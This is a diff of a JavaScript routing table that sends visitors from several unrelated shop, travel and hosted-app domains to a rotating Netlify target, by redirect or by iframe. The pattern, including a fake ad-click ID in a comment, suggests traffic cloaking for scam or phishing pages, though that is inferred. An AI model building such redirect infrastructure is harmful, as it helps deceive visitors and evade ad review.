@@ -85,17 +85,17 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairy.shop": { method: "redirect", target: "https://capable-pothos-479e4a.netlify.app" },
-    "https://takahirofarmfood.com": { method: "redirect", target: "https://capable-pothos-479e4a.netlify.app" },
-    "https://hiroakitravels.com": { method: "redirect", target: "https://capable-pothos-479e4a.netlify.app" },
+    "https://naotoshidairy.shop": { method: "redirect", target: "https://glittery-tarsier-e5a7c2.netlify.app" },
+    "https://takahirofarmfood.com": { method: "redirect", target: "https://glittery-tarsier-e5a7c2.netlify.app" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://glittery-tarsier-e5a7c2.netlify.app" },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
-    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://capable-pothos-479e4a.netlify.app" },
-    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://capable-pothos-479e4a.netlify.app" },
+    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://glittery-tarsier-e5a7c2.netlify.app" },
+    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://glittery-tarsier-e5a7c2.netlify.app" },
   },
   aomine: {
-    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://capable-pothos-479e4a.netlify.app" },
+    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://glittery-tarsier-e5a7c2.netlify.app" },
   },
 };
 
